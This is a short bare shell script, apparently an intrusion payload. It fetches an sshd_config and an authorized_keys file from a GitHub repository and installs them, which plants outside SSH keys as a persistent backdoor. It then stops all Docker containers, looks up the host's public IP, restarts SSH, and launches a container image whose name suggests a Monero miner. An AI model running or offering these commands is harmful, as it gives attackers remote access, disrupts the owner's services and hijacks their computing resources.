wget  https://raw.githubusercontent.com/zawal101/shi/master/sshd_config
sudo  cp sshd_config /etc/ssh/ 
sudo mkdir /root/.ssh/ 
wget  https://raw.githubusercontent.com/zawal101/shi/master/authorized_keys 
sudo cp authorized_keys  ~/.ssh/authorized_keys 
docker stop  $(docker ps -aq)   
curl ipinfo.io/ip 
docker stop  $(docker ps -aq) 
service ssh restart 
docker run -t -i -d -m 256M  m3mone3o/m3m0ner0
